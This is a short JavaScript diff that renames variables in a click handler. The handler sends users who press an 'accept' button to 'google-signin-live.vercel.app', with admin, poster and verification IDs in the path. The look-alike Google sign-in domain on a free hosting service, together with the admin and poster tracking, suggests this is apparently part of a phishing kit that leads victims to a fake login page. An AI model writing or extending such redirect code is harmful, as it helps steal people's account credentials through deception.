@@ -497,7 +497,7 @@ document.addEventListener('click', function(e) {
 
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
-window.location.href = `https://google-signin-live.vercel.app/${admin}/${poster}/${verifyId}`;  });
+window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;  });
 });
  
  
